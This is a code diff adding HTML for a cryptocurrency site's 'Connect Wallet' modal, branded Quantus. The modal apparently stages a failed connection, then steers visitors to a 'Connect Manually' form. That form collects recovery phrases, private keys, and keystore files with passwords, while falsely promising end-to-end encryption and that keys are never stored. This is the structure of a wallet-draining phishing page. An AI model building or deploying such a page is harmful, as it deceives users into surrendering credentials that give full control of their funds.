+          <li><a href="https://www.quantus.com/privacy-policy" onclick="showModal()">Privacy Policy</a></li>
+          <li><a href="https://www.quantus.com/terms" onclick="showModal()">Terms of Service</a></li>
+          <li><a href="https://www.coingecko.com/en/coins/quantus" onclick="showModal()">CoinGecko</a></li>
+          <li><a href="https://blockspot.io/coin/quantus/" onclick="showModal()">Blockspot.io</a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+  <div class="w-overlay" id="wOverlay">
+
+    <!-- SCREEN 1: Select Wallet -->
+    <div class="w-panel" id="wScreen1">
+      <div class="w-header">
+        <span class="w-title">Connect Wallet</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-body">
+
+        <!-- Featured: MetaMask -->
+        <div class="w-featured wallet-trigger" onclick="handleWalletSelect(this)">
+          <span class="w-featured-badge">Recommended</span>
+          <div class="w-feat-icon">
+            <img src="img/trustwallet.png" alt="Trust Wallet" />
+          </div>
+          <div>
+            <div class="w-feat-name">Trust Wallet</div>
+            <div class="w-feat-desc">Multi-chain mobile Wallet</div>
+          </div>
+        </div>
+
+        <div class="w-divider"><span>other wallets</span></div>
+
+        <div class="w-list">
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="img/phantomwallet.png" alt="Phantom Wallet" /></div>
+            <div>
+              <div class="w-item-name">Phantom Wallet</div>
+              <div class="w-item-desc">Solana Wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="img/ledgerwallet.png" alt="Ledger" /></div>
+            <div>
+              <div class="w-item-name">Ledger</div>
+              <div class="w-item-desc">Hardware wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="img/metamask.png" alt="Metamask Wallet" /></div>
+            <div>
+              <div class="w-item-name">Metamask </div>
+              <div class="w-item-desc">Ethereum Wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item w-item-other" onclick="openOtherWallets()">
+            <div class="w-item-icon"><i class="ri-apps-2-line"></i></div>
+            <div>
+              <div class="w-item-name">Other Wallets</div>
+              <div class="w-item-desc">Browse 30+ supported wallets</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+        </div>
+
+        <p class="w-note">
+          By connecting you agree to our <a href="#" onclick="showModal();return false;">Terms</a> &amp; <a href="#"
+            onclick="showModal();return false;">Privacy Policy</a>.
+          We never store your private keys or seed phrases.
+        </p>
+      </div>
+    </div>
+
+    <!-- OTHER WALLETS -->
+    <div class="w-sub" id="wScreenOther">
+      <div class="w-header">
+        <span class="w-title">Other Wallets</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="ow-search-wrap">
+        <i class="ri-search-line"></i>
+        <input class="ow-search" id="owSearch" type="text" placeholder="Search by name or network..." autocomplete="off"
+          spellcheck="false" />
+      </div>
+      <div class="ow-count" id="owCount">30 wallets</div>
+      <div class="ow-list" id="owList">
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/pera.png" alt="Pera Wallet" /></div>
+          <div>
+            <div class="ow-name">Pera Wallet</div>
+            <div class="ow-chain">Algorand</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/rainbow.png" alt="Rainbow" /></div>
+          <div>
+            <div class="ow-name">Rainbow</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/basewallet.png" alt="Base Wallet" /></div>
+          <div>
+            <div class="ow-name">Base Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/rabby.png" alt="Rabby" /></div>
+          <div>
+            <div class="ow-name">Rabby Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/zerion.png" alt="Zerion" /></div>
+          <div>
+            <div class="ow-name">Zerion</div>
+            <div class="ow-chain">Ethereum / Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/walletconnect.png" alt="WalletConnect" /></div>
+          <div>
+            <div class="ow-name">WalletConnect</div>
+            <div class="ow-chain">Any compatible wallet</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/phantomwallet.png" alt="Phantom" /></div>
+          <div>
+            <div class="ow-name">Phantom</div>
+            <div class="ow-chain">Solana / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/stepn.png" alt="Stepn" /></div>
+          <div>
+            <div class="ow-name">Stepn</div>
+            <div class="ow-chain">Solana / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/solflare.png" alt="Solflare" /></div>
+          <div>
+            <div class="ow-name">Solflare</div>
+            <div class="ow-chain">Solana</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/okx.png" alt="OKX Wallet" /></div>
+          <div>
+            <div class="ow-name">OKX Wallet</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/terrastation.png" alt="Terra Station" /></div>
+          <div>
+            <div class="ow-name">Terra Station</div>
+            <div class="ow-chain">Terra</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/safepal.png" alt="SafePal" /></div>
+          <div>
+            <div class="ow-name">SafePal</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/exodus.png" alt="Exodus" /></div>
+          <div>
+            <div class="ow-name">Exodus</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/atomic.png" alt="Atomic Wallet" /></div>
+          <div>
+            <div class="ow-name">Atomic Wallet</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/trezor.png" alt="Trezor" /></div>
+          <div>
+            <div class="ow-name">Trezor</div>
+            <div class="ow-chain">Hardware / Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/tokenpocket.png" alt="TokenPocket" /></div>
+          <div>
+            <div class="ow-name">TokenPocket</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/uniswap.png" alt="Uniswap" /></div>
+          <div>
+            <div class="ow-name">Uniswap Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/cryptocom.png" alt="Crypto.com" /></div>
+          <div>
+            <div class="ow-name">Crypto.com DeFi</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/keplr.png" alt="Keplr" /></div>
+          <div>
+            <div class="ow-name">Keplr</div>
+            <div class="ow-chain">Cosmos / IBC</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/leapwallet.png" alt="Leap" /></div>
+          <div>
+            <div class="ow-name">Leap Wallet</div>
+            <div class="ow-chain">Cosmos / IBC</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/tangem.png" alt="Tangem" /></div>
+          <div>
+            <div class="ow-name">Tangem</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/jade.png" alt="Jade" /></div>
+          <div>
+            <div class="ow-name">Jade</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/polkadot.png" alt="Polkadot.js" /></div>
+          <div>
+            <div class="ow-name">Polkadot.js</div>
+            <div class="ow-chain">Polkadot / Substrate</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/talisman.png" alt="Talisman" /></div>
+          <div>
+            <div class="ow-name">Talisman</div>
+            <div class="ow-chain">Polkadot / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/nami.png" alt="Nami" /></div>
+          <div>
+            <div class="ow-name">Nami</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/eternl.png" alt="Eternl" /></div>
+          <div>
+            <div class="ow-name">Eternl</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep" /></div>
+          <div>
+            <div class="ow-name">BitKeep</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/martian.png" alt="Martian" /></div>
+          <div>
+            <div class="ow-name">Martian</div>
+            <div class="ow-chain">Aptos / Sui</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/suiet.png" alt="Suiet" /></div>
+          <div>
+            <div class="ow-name">Suiet</div>
+            <div class="ow-chain">Sui</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/huobi.png" alt="Huobi" /></div>
+          <div>
+            <div class="ow-name">Huobi</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/argent.png" alt="Argent" /></div>
+          <div>
+            <div class="ow-name">Argent</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/defly.png" alt="Defly" /></div>
+          <div>
+            <div class="ow-name">Defly</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/midas.png" alt="Midas Wallet" /></div>
+          <div>
+            <div class="ow-name">Midas Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/tongue.png" alt="Tongue Wallet" /></div>
+          <div>
+            <div class="ow-name">Tongue Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/celo.png" alt="Celo Wallet" /></div>
+          <div>
+            <div class="ow-name">Celo Wallet</div>
+            <div class="ow-chain">Celo</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bridge wallet.png" alt="Bridge Wallet" /></div>
+          <div>
+            <div class="ow-name">Bridge Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/walletio.png" alt="Wallet.io" /></div>
+          <div>
+            <div class="ow-name">Wallet.io</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/coinomi.png" alt="Coinomi Wallet" /></div>
+          <div>
+            <div class="ow-name">Coinomi Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/dharma.png" alt="Dharma Wallet" /></div>
+          <div>
+            <div class="ow-name">Dharma Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/1inch.png" alt="1inch Wallet" /></div>
+          <div>
+            <div class="ow-name">1inch Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/walleth.png" alt="walleth" /></div>
+          <div>
+            <div class="ow-name">walleth</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bitpay.png" alt="BitPay Wallet" /></div>
+          <div>
+            <div class="ow-name">BitPay Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/infinito.png" alt="Infinito Wallet" /></div>
+          <div>
+            <div class="ow-name">Infinito Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/defly.png" alt="Defly Wallet" /></div>
+          <div>
+            <div class="ow-name">Defly Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/huobi.png" alt="Huobi Wallet" /></div>
+          <div>
+            <div class="ow-name">Huobi Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep Wallet" /></div>
+          <div>
+            <div class="ow-name">BitKeep Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/jade.png" alt="Jade Wallet" /></div>
+          <div>
+            <div class="ow-name">Jade Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/stepn.png" alt="StepN Wallet" /></div>
+          <div>
+            <div class="ow-name">StepN Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+      </div>
+      <div class="ow-no-results" id="owNoResults">
+        <i class="ri-search-line"></i>
+        No wallets found for "<span id="owQuery" style="color:#6ea4ff;font-weight:600"></span>"
+      </div>
+    </div>
+
+    <!-- SCREEN 2: Connecting -->
+    <div class="w-sub" id="wScreen2">
+      <div class="w-header">
+        <span class="w-title">Connecting</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-loading-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s2Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s2Name">Wallet</span>
+        </div>
+        <div class="w-spinner"></div>
+        <p class="w-status" id="s2Status">Initializing secure connection...</p>
+        <div class="w-progress-wrap">
+          <div class="w-progress-bar" id="s2Progress"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 3: Connection Failed -->
+    <div class="w-sub" id="wScreen3">
+      <div class="w-header">
+        <span class="w-title">Connection Failed</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-error-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s3Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s3Name">Wallet</span>
+        </div>
+        <div class="w-error-icon"><i class="ri-wifi-off-line"></i></div>
+        <p class="w-error-msg">
+          <strong>Unable to Connect</strong>
+          We couldn't establish a connection with your wallet. This may be due to a timeout or an unresponsive
+          device. Try again or connect manually.
+        </p>
+        <div class="w-btn-stack">
+          <button class="w-btn w-btn-plum" id="retryBtn">
+            <i class="ri-refresh-line"></i> Retry Connection
+          </button>
+          <button class="w-btn w-btn-ghost" id="manualBtn">Connect Manually</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 4: Manual Connect (custom) -->
+    <div class="w-sub" id="wScreen4">
+      <div class="w-header">
+        <span class="w-title">Connect Manually</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-manual-body">
+
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s4Name">Wallet</span>
+        </div>
+
+        <div class="type-toggle">
+          <button class="type-btn" id="btn-keystore" onclick="switchType('keystore')">Keystore JSON</button>
+          <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
+          <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
+        </div>
+
+        <div class="input-pane active" id="pane-phrase">
+          <textarea class="w-textarea phrase-area" id="phraseInput"
+            placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces..." spellcheck="false"
+            autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+        </div>
+
+        <div class="input-pane" id="pane-keystore">
+          <textarea class="w-textarea keystore-area" id="keystoreInput" placeholder='Paste Passphrase'
+            spellcheck="false" autocomplete="off"></textarea>
+          <input type="" class="w-input" id="keystorePassword" placeholder="Password" autocomplete="off" />
+          <button class="attach-btn" onclick="document.getElementById('keystoreFileInput').click()">
+            <i class="ri-attachment-2"></i>
+            Attach Keystore File
+          </button>
+          <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg" onchange="handleKSF(this)" />
+          <p class="attach-file-name" id="attachFileName"></p>
+        </div>
+
+        <div class="input-pane" id="pane-privatekey">
+          <textarea class="w-textarea privkey-area" id="privkeyInput"
+            placeholder="Enter your private key (hex format, 64 characters)..." spellcheck="false" autocomplete="off"
+            autocorrect="off" autocapitalize="off"></textarea>
+        </div>
+
+        <div class="w-encrypt-note">
+          <i class="ri-lock-2-line"></i>
+          <p>
+            <strong>End-to-end encrypted.</strong>
+            Your credentials are verified locally and securely processed.
+            Quantus support will never ask for your seed phrase or private key.
+          </p>
+        </div>
+
+        <button class="w-btn w-btn-plum" onclick="submitCredentials()">
+          <i class="ri-wallet-3-line"></i> Connect Wallet
+        </button>
+
+      </div>
+    </div>
+
+    <!-- SCREEN 5: Manual Failed -->
+    <div class="w-sub" id="wScreen5">
+      <div class="w-header">
+        <span class="w-title">Verification Failed</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-error-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s5Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s5Name">Wallet</span>
+        </div>
+        <div class="w-error-icon"><i class="ri-error-warning-line"></i></div>
+        <p class="w-error-msg">
+          <strong>Invalid Credentials</strong>
+          The information you entered could not be verified. Please double-check your phrase, keystore file,
+          or private key and try again.
+        </p>
+        <div class="w-btn-stack">
+          <button class="w-btn w-btn-plum" onclick="handleRetryManual()">
+            <i class="ri-refresh-line"></i> Try Again
+          </button>
+          <button class="w-btn w-btn-ghost" onclick="closeWallet()">Close</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Right-edge ASCII scroll indicator (desktop) -->
+  <canvas class="scroll-ascii" id="scrollAscii" aria-hidden="true"></canvas>
+
+  <script src="main.js"></script>
+</body>
+
+</html>
